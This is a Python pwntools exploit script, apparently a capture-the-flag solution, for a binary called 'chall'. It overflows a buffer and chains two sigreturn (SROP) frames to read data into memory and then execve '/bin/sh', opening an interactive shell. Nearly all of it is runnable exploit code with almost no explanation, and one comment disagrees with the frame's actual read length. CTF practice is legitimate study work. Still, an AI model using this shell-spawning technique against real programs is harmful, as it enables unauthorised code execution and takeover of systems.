#!/usr/bin/env python3

from pwn import *

exe = ELF('chall', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*0x000000000040122e

        c
        ''')
        input()

if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
GDB()
# 0x00000000004011ef : pop rax ; ret
# 0x00000000004011f1 : syscall
pop_rax = 0x4011ef
syscall = 0x4011f1

# --- 1) tạo SROP để kernel thực hiện read(0, 0x404500, 0x100)
frame1 = SigreturnFrame()
frame1.rax = 0       # syscall read
frame1.rdi = 0       # fd 0
frame1.rsi = 0x404500
frame1.rdx = 0x8
frame1.rsp = 0x0000000000401212
frame1.rip = syscall

payload1 = flat(
    cyclic(0x88), 
    pop_rax, 0xf,
    syscall,
    bytes(frame1),
    b'/bin/sh\x00'
)
sa(b'\n', payload1)

frame2 = SigreturnFrame()
frame2.rax = 0x3b
frame2.rdi = 0x404500
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall
frame2.rsp = 0x404500

data_for_read = bytes(frame2)
s(data_for_read)
p.interactive()